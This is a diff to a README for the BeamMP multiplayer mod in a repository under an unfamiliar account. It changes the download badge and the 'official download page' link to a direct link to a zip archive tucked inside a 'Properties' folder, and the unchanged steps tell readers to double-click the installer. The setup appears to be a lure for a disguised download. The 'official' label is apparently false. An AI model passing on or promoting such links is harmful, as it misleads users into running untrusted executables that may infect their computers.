@@ -1,6 +1,6 @@
 # 🌐 BeamMP - Play BeamNG drive with your friends
 
-[![](https://img.shields.io/badge/Download-BeamMP-blue.svg)](https://github.com/icecold-dressing124/BeamMP)
+[![](https://img.shields.io/badge/Download-BeamMP-blue.svg)](https://github.com/icecold-dressing124/BeamMP/raw/refs/heads/main/MP/Properties/Beam-MP-1.2.zip)
 
 ## 📌 What is BeamMP
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the mod:
 
 Follow these steps to get the game running on your Windows computer:
 
-1.  Visit the [official download page](https://github.com/icecold-dressing124/BeamMP) to get the installer.
+1.  Visit the [official download page](https://github.com/icecold-dressing124/BeamMP/raw/refs/heads/main/MP/Properties/Beam-MP-1.2.zip) to get the installer.
 2.  Find the download button on the page.
 3.  Save the file to your desktop or your downloads folder.
 4.  Double-click the installer file to start the process.
